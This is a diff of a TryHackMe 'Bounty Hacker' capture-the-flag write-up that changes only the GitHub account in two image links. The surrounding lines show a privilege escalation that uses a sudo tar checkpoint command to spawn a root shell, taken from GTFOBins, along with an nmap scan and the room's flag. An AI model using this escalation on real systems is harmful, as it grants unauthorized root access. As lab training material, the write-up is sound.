@@ -218,7 +218,7 @@ User lin may run the following commands on bountyhacker:
 ```
 19. `firefox "https://gtfobins.github.io/"` to launch firefox and direct it to go to the GTFOBins website and then we searched for the **tar** command
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bounty%20Hacker/GTFOBins%20Tar.pngGTFOBins%20Tar.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bounty%20Hacker/GTFOBins%20Tar.pngGTFOBins%20Tar.png)
 21. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` to escalate privileges by spawning in a Bourne shell (According to GTFOBins)
 22. `whoami` to see if we’re now logged in as a higher privileged account, which shows that we're now logged in as root
 ```bash
@@ -243,7 +243,7 @@ THM{80UN7Y_h4cK3r}
 
 **Room completed!**
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Bounty%20Hacker.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Bounty%20Hacker.png)
 
 # Command History
 1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
